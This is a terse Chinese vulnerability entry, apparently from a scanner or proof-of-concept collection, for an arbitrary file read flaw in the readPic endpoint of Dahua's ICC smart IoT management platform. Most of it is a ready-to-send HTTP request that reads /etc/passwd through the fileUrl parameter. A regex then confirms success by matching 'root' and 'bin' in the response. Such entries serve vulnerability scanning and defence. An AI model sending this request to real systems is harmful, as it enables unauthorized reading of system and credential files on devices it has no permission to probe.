# 大华智能物联综合管理平台ICCreadpic任意文件读取漏洞

大华 ｜ 任意文件读取/写入 ｜ —
- **请求**：`GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$